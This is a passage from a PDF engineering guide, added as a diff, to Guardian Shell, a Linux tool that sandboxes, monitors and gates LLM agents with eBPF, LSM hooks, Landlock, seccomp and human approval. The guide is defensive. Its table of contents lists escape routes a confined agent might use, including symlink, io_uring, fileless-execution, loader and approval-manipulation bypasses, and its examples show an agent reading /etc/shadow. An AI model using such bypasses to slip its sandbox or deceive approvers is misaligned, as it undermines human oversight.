@@ -1,0 +1,8440 @@
+%PDF-1.4
+%âãÏÓ
+1 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+2 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>
+endobj
+3 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Courier >>
+endobj
+4 0 obj
+<< /Length 3344 >>
+stream
+BT
+/F2 20 Tf
+1 0 0 1 54 732 Tm
+(Guardian Shell ? Linux Security Concepts Deep Dive) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 698 Tm
+(A Complete Guide for Engineers Date: March 19, 2026 Audience: Junior to senior engineers) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 683 Tm
+(learning Linux kernel security, eBPF, and defense-in-depth) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 652 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 634 Tm
+(How to Read This Document) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 606 Tm
+(This document explains every security mechanism used in Guardian Shell ? a tool that) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 591 Tm
+(monitors and restricts what LLM agents can do on a Linux machine. Each section follows a) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 576 Tm
+(pattern:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 551 Tm
+(1. What is the problem? ? The attack or weakness being addressed) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 530 Tm
+(2. What is the Linux concept? ? The kernel feature used to solve it) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 509 Tm
+(3. How does Guardian Shell use it? ? Exact code, maps, and data flow) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 488 Tm
+(4. A concrete example ? Step-by-step walkthrough an attacker would try and how it) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 473 Tm
+(   gets stopped) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 452 Tm
+(If you are new to Linux internals, start from Section 1 and read sequentially ? each) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 437 Tm
+(section builds on the previous one.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 406 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 388 Tm
+(Table of Contents) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 360 Tm
+(1. The Big Picture: Why One Layer Is Never Enough) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 345 Tm
+(   \(#1-the-big-picture-why-one-layer-is-never-enough\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 324 Tm
+(2. eBPF: Programmable Kernel Hooks \(#2-ebpf-programmable-kernel-hooks\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 303 Tm
+(- 2.1 What Is eBPF? - 2.2 Tracepoints ? Watching Syscalls - 2.3 BPF Maps ? Kernel-Side) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 288 Tm
+(Data Structures - 2.4 The Per-CPU Scratch Buffer Pattern) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 263 Tm
+(3. LSM Hooks: Kernel-Level Enforcement \(#3-lsm-hooks-kernel-level-enforcement\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 242 Tm
+(- 3.1 What Is a Linux Security Module? - 3.2 The Tracepoint ? PENDING_DENY ? LSM Pattern) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 227 Tm
+(- 3.3 file_open ? Blocking File Access - 3.4 bprm_check_security ? Blocking Program) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 212 Tm
+(Execution - 3.5 socket_connect ? Blocking Network Connections - 3.6 Inode Hooks ?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 197 Tm
+(Blocking Rename, Delete, and Hardlink) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 172 Tm
+(4. Symlink Resolution via bpf_d_path\(\) \(#4-symlink-resolution-via-bpf_dpath\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 151 Tm
+(- 4.1 The Symlink Bypass Problem - 4.2 What Is bpf_d_path\(\)? - 4.3 How It Resolves) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 136 Tm
+(Symlinks at the Kernel Level - 4.4 Before and After: Attack Walkthrough) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 111 Tm
+(5. TOCTOU: The Time-of-Check-to-Time-of-Use Race) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 96 Tm
+(   \(#5-toctou-the-time-of-check-to-time-of-use-race\)) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 1 of 40) Tj
+ET
+endstream
+endobj
+5 0 obj
+<< /Length 3475 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 726 Tm
+(- 5.1 What Is a TOCTOU Attack? - 5.2 Why Tracepoint-Based Checking Is Vulnerable - 5.3) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 711 Tm
+(The Fix: LSM-Only Enforcement) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 686 Tm
+(6. Landlock: Inode-Level Filesystem Sandbox) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 671 Tm
+(   \(#6-landlock-inode-level-filesystem-sandbox\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 650 Tm
+(- 6.1 What Is Landlock? - 6.2 Why Is It Symlink-Immune? - 6.3 How Guardian Shell Applies) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 635 Tm
+(Landlock - 6.4 Default-Deny Model - 6.5 Network Port Filtering \(Kernel 6.7+\) - 6.6 The) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 620 Tm
+(Full Sandbox Sequence) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 595 Tm
+(7. Seccomp: Blocking Dangerous Syscalls \(#7-seccomp-blocking-dangerous-syscalls\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 574 Tm
+(- 7.1 What Is Seccomp? - 7.2 io_uring ? The Invisible File I/O Bypass - 7.3 memfd_create) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 559 Tm
+(+ execveat ? Fileless Execution - 7.4 Mount and Namespace Escape - 7.5 The Complete) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 544 Tm
+(Seccomp Filter) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 519 Tm
+(8. Dynamic Linker Detection \(#8-dynamic-linker-detection\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 498 Tm
+(- 8.1 The ld-linux Bypass - 8.2 How Guardian Detects It - 8.3 Reading argv[1] in eBPF) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 473 Tm
+(9. Inode Hooks: Rename, Unlink, and Hardlink Protection) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 458 Tm
+(   \(#9-inode-hooks-rename-unlink-and-hardlink-protection\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 437 Tm
+(- 9.1 The Rename Attack - 9.2 The Hardlink Attack - 9.3 How Guardian Blocks Both) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 412 Tm
+(10. Network Enforcement \(#10-network-enforcement\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 391 Tm
+(- 10.1 The sys_enter_connect Tracepoint - 10.2 Port-Based Policy Maps - 10.3 LSM) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 376 Tm
+(socket_connect ? Kernel-Level Blocking - 10.4 DNS Monitoring via Port 53) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 351 Tm
+(11. Path Canonicalization and Normalization) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 336 Tm
+(   \(#11-path-canonicalization-and-normalization\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 315 Tm
+(- 11.1 The /proc/self/root/ Bypass - 11.2 The ../ Traversal Bypass - 11.3) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 300 Tm
+(normalize_path\(\) ? Userspace Quick Fix - 11.4 Path Truncation Safety) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 275 Tm
+(12. Strict Enforcement Mode \(#12-strict-enforcement-mode\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 254 Tm
+(- 12.1 Monitor vs Enforce vs Strict - 12.2 Why Strict Mode Matters) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 229 Tm
+(13. Configurable Fail-Closed Mode \(#13-configurable-fail-closed-mode\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 208 Tm
+(- 13.1 Fail-Open vs Fail-Closed - 13.2 Per-Cgroup Fail-Closed via BPF Map) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 183 Tm
+(14. The Approval Workflow Security Model \(#14-the-approval-workflow-security-model\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 162 Tm
+(- 14.1 Permission Requests and Oneshot Channels - 14.2 Risk Classification \(4-Tier) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 147 Tm
+(Scoring\) - 14.3 Rate Limiting and Exponential Backoff - 14.4 Auto-Deny and Auto-Approve) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 132 Tm
+(- 14.5 Justification Analysis \(Social Engineering Detection\) - 14.6 Grant Accumulation) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 117 Tm
+(Limits - 14.7 Risk-Based Configurable Timeouts - 14.8 CLI-Based Permission Approval) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 2 of 40) Tj
+ET
+endstream
+endobj
+6 0 obj
+<< /Length 3704 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(15. Anomaly Detection \(#15-anomaly-detection\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 711 Tm
+(- 15.1 What Is Anomaly Detection? - 15.2 Rubber-Stamping Detection - 15.3 Request Flood) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 696 Tm
+(Detection - 15.4 Deny-Then-Approve Persistence Pattern - 15.5 The SQLite Audit Trail) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 671 Tm
+(16. Dashboard Authentication \(#16-dashboard-authentication\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 650 Tm
+(- 16.1 Bearer Token Authentication - 16.2 Auto-Generated Tokens for Non-Localhost) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 625 Tm
+(17. Live BPF Map Sync on Policy Edit \(#17-live-bpf-map-sync-on-policy-edit\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 604 Tm
+(- 17.1 The Stale Map Problem - 17.2 Immediate Map Reload on Save) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 579 Tm
+(18. SIGHUP Config Reload \(#18-sighup-config-reload\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 558 Tm
+(- 18.1 What Is SIGHUP? - 18.2 What Gets Reloaded) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 533 Tm
+(19. BTF-Based Portable Tracepoint Offsets \(#19-btf-based-portable-tracepoint-offsets\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 512 Tm
+(- 19.1 The Hardcoded Offset Problem - 19.2 What Is BTF? - 19.3 How BTF Makes eBPF) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 497 Tm
+(Portable) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 472 Tm
+(20. The Two Security Tiers \(#20-the-two-security-tiers\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 451 Tm
+(21. Summary: All Layers Working Together \(#21-summary-all-layers-working-together\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 424 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 406 Tm
+(1. The Big Picture: Why One Layer Is Never Enough) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 378 Tm
+(Imagine you are building a bank vault. You would not rely on a single lock ? you would) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 363 Tm
+(use a combination of:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 338 Tm
+(- A reinforced door \(physical barrier\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 317 Tm
+(- An alarm system \(detection\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 296 Tm
+(- Security cameras \(audit trail\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 275 Tm
+(- A guard who checks IDs \(access control\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 254 Tm
+(Guardian Shell applies the same principle to Linux security. It uses multiple) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 239 Tm
+(independent layers, each catching attacks the others might miss:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 214 Tm
+(???????????????????????????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 202 Tm
+(?                    LLM Agent Process                     ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 190 Tm
+(???????????????????????????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 178 Tm
+(?  Layer 1: Landlock      ? Inode-level file sandbox       ?  ? Symlink-immune) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 166 Tm
+(?  Layer 2: Seccomp       ? Blocks dangerous syscalls      ?  ? io_uring, memfd, mount) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 154 Tm
+(?  Layer 3: eBPF LSM      ? Kernel enforcement hooks       ?  ? file_open, bprm_check) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 142 Tm
+(?  Layer 4: eBPF Trace    ? Syscall monitoring + logging   ?  ? Audit trail) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 130 Tm
+(?  Layer 5: Cgroup        ? Resource limits + identity     ?  ? CPU, memory, PIDs) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 118 Tm
+(?  Layer 6: Approval      ? Human-in-the-loop decisions    ?  ? Rate limiting, risk scoring) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 106 Tm
+(?  Layer 7: Anomaly       ? Pattern detection on approvals ?  ? Rubber-stamping detection) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 94 Tm
+(???????????????????????????????????????????????????????????) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 3 of 40) Tj
+ET
+endstream
+endobj
+7 0 obj
+<< /Length 3398 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 724 Tm
+(Each layer is independent ? if one fails, the others still protect. This is called) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 709 Tm
+(defense-in-depth.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 678 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 660 Tm
+(2. eBPF: Programmable Kernel Hooks) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 632 Tm
+(2.1 What Is eBPF?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 609 Tm
+(eBPF \(extended Berkeley Packet Filter\) lets you run small programs inside the Linux) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 594 Tm
+(kernel without modifying kernel source code or loading kernel modules. Think of it as) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 579 Tm
+("JavaScript for the kernel" ? a safe, sandboxed scripting language that the kernel) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 564 Tm
+(itself executes.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 539 Tm
+(??????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 527 Tm
+(?          Userspace                  ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 515 Tm
+(?  ???????????????????????????????   ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 503 Tm
+(?  ?    Guardian Daemon \(Rust\)    ?   ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 491 Tm
+(?  ?    Reads events, manages     ?   ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 479 Tm
+(?  ?    policy, serves dashboard  ?   ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 467 Tm
+(?  ???????????????????????????????   ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 455 Tm
+(?             ? PerfEventArray        ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 443 Tm
+(??????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 431 Tm
+(?             ?                       ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 419 Tm
+(?  ???????????????????????????????   ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 407 Tm
+(?  ?    eBPF Program \(Rust?BPF\)   ?   ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 395 Tm
+(?  ?    Runs inside the kernel    ?   ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 383 Tm
+(?  ?    Hooks: openat, execve,    ?   ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 371 Tm
+(?  ?    connect, file_open, etc.  ?   ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 359 Tm
+(?  ???????????????????????????????   ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 347 Tm
+(?          Kernel Space               ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 335 Tm
+(??????????????????????????????????????) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 315 Tm
+(Key constraints of eBPF:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 290 Tm
+(- 512-byte stack limit ? you cannot have large local variables) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 269 Tm
+(- Bounded loops only ? every loop must have a provable maximum iteration count) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 248 Tm
+(- No dynamic memory allocation ? you must use pre-allocated maps) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 227 Tm
+(- Verified before execution ? the kernel verifier checks your program is safe before) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 212 Tm
+(   it runs) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 191 Tm
+(2.2 Tracepoints ? Watching Syscalls) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 168 Tm
+(A syscall \(system call\) is how a userspace program asks the kernel to do something. When) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 153 Tm
+(an agent calls open\("/etc/shadow"\), it triggers the openat syscall. Guardian attaches) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 138 Tm
+(eBPF programs to tracepoints ? predefined instrumentation points at syscall entry.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 113 Tm
+(Guardian hooks these tracepoints:) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 4 of 40) Tj
+ET
+endstream
+endobj
+8 0 obj
+<< /Length 3904 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(| Tracepoint | Syscall | What It Watches | |------------|---------|-----------------| |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 717 Tm
+(sys_enter_openat | openat\(\) | File opens \(the most common\) | | sys_enter_openat2 |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 702 Tm
+(openat2\(\) | Newer file open variant \(Linux 5.6+\) | | sys_enter_open | open\(\) | Legacy) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 687 Tm
+(file open \(rare but possible\) | | sys_enter_execve | execve\(\) | Program execution | |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 672 Tm
+(sys_enter_connect | connect\(\) | Network connections | | sys_enter_renameat2 |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 657 Tm
+(renameat2\(\) | File renames | | sys_enter_unlinkat | unlinkat\(\) | File deletions | |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 642 Tm
+(sys_enter_linkat | linkat\(\) | Hardlink creation | | sched_process_fork | fork\(\)/clone\(\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 627 Tm
+(| Child process creation | | sched_process_exit | exit\(\) | Process termination |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 602 Tm
+(Example: What happens when an agent reads a file) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 577 Tm
+(Agent code:   cat /tmp/data.txt) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 565 Tm
+(                    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 553 Tm
+(                    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 541 Tm
+(Syscall:      openat\(AT_FDCWD, "/tmp/data.txt", O_RDONLY\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 529 Tm
+(                    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 517 Tm
+(                    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 505 Tm
+(Tracepoint:   sys_enter_openat fires) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 493 Tm
+(                    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 481 Tm
+(                    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 469 Tm
+(eBPF program: 1. Read filename from syscall args) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 457 Tm
+(              2. Check: is this process watched?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 445 Tm
+(              3. Evaluate policy: is /tmp/data.txt allowed?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 433 Tm
+(              4. If denied: set PENDING_DENY map entry) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 421 Tm
+(              5. Send event to userspace via PerfEventArray) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 409 Tm
+(                    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 397 Tm
+(                    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 385 Tm
+(LSM hook:     file_open fires) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 373 Tm
+(              1. Check PENDING_DENY map) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 361 Tm
+(              2. If entry exists: return -EACCES \(block!\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 349 Tm
+(              3. If no entry: return 0 \(allow\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 337 Tm
+(                    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 325 Tm
+(                    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 313 Tm
+(Result:       Agent gets "Permission denied" or file contents) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 293 Tm
+(2.3 BPF Maps ? Kernel-Side Data Structures) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 270 Tm
+(BPF Maps are data structures shared between the eBPF program \(in-kernel\) and the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 255 Tm
+(userspace daemon. They are the only way to pass data between kernel and userspace in the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 240 Tm
+(eBPF model.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 215 Tm
+(Guardian uses several types of maps:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 190 Tm
+(HashMap ? Key-value lookup, like a dictionary:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 165 Tm
+(DENY_EXACT map \(HashMap\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 153 Tm
+(  Key: "/etc/shadow\\0\\0\\0..." \(256 bytes, null-padded\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 141 Tm
+(  Value: 1 \(u8, means "this path is denied"\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 117 Tm
+(Lookup: O\(1\) ? instant lookup regardless of how many entries exist) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 97 Tm
+(LpmTrie \(Longest Prefix Match Trie\) ? For pattern matching like /tmp/**:) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 5 of 40) Tj
+ET
+endstream
+endobj
+9 0 obj
+<< /Length 4139 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 722 Tm
+(DENY_PREFIXES map \(LpmTrie\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 710 Tm
+(  Key: { prefix_len: 32, data: "/tmp/" }    ? matches anything starting with /tmp/) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 698 Tm
+(  Value: 1) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 674 Tm
+(Matching: "/tmp/secret.txt"    ? MATCH \(starts with /tmp/\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 662 Tm
+(          "/tmp/a/b/c"         ? MATCH \(starts with /tmp/\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 650 Tm
+(          "/home/user/tmp"     ? NO MATCH \(does not start with /tmp/\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 630 Tm
+(PerCpuArray ? One slot per CPU core, used as scratch buffers:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 605 Tm
+(EVENT_BUF map \(PerCpuArray\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 593 Tm
+(  CPU 0: [292 bytes of FileAccessEvent scratch space]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 581 Tm
+(  CPU 1: [292 bytes of FileAccessEvent scratch space]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 569 Tm
+(  CPU 2: [292 bytes of FileAccessEvent scratch space]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 557 Tm
+(  ...) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 533 Tm
+(Why per-CPU? eBPF programs can run on any CPU simultaneously.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 521 Tm
+(If two agents open files at the same time on different CPUs,) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 509 Tm
+(each gets its own scratch buffer ? no locking needed.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 489 Tm
+(PerfEventArray ? Ring buffer for streaming events to userspace:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 464 Tm
+(EVENTS map \(PerfEventArray\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 452 Tm
+(  eBPF writes event ? kernel buffers it ? daemon reads it asynchronously) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 440 Tm
+(  This is how the dashboard gets real-time file access events.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 420 Tm
+(Here is the complete map inventory \(38 maps total\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 395 Tm
+(Identity Maps \(who to watch\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 383 Tm
+(  WATCHED_COMMS       ? 1024 entries ? Process names being monitored) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 371 Tm
+(  ENFORCE_COMMS       ? 1024 entries ? Process names being enforced) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 359 Tm
+(  WATCHED_CGROUPS     ? 1024 entries ? Cgroup IDs being monitored) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 347 Tm
+(  ENFORCE_CGROUPS     ? 1024 entries ? Cgroup IDs being enforced) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 335 Tm
+(  WATCHED_TGIDS       ? 4096 entries ? Thread Group IDs being monitored) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 323 Tm
+(  ENFORCE_TGIDS       ? 4096 entries ? Thread Group IDs being enforced) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 311 Tm
+(  CHILD_PIDS          ? 4096 entries ? Parent?Child PID tracking) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 287 Tm
+(File Policy Maps \(what files are allowed/denied\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 275 Tm
